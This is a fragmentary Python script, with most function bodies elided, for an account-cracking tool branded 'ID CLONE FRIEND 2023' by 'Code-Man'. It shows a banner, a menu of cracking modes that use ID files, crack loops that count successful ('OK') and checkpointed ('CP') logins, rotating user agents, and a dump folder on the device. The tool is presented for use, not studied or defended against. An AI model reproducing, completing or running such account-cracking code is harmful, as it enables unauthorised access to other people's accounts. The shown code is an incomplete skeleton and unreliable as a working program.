...
╔════════════════════════════════════════╗                        |       [*]  ID CLONE FRIEND 2023  [*]   |
|════════════════════════════════════════|
| [✓] 𝔸𝕌𝕋ℍ𝕆ℝ   > Code-Man                   |
| [✓] 𝕐𝕆𝕌𝕋𝕌𝔹𝔼  > ******         |
| [✓]  ℂ𝕙𝕒𝕟𝕟𝕖𝕝  >𝐶𝑜𝑑𝑒𝑀𝑎𝑛𝐶𝑟𝑎𝑐𝑘𝑒𝑟                 |
╚════════════════════════════════════════╝
			''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
...
def menu():
	...
	print('\x1b[92;1m[ 2 ] CRACK TAKING FILE')
	print("[ 3 ] CRACK WITH FILE")
	print('[ 0 ] LOG OUT')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[ Code-Man ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{asu})  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[ Code-Man ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{P})  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
...
if __name__=='__main__':
	...
	try:os.mkdir('/sdcard/Code-Man-DUMP')
	except:pass
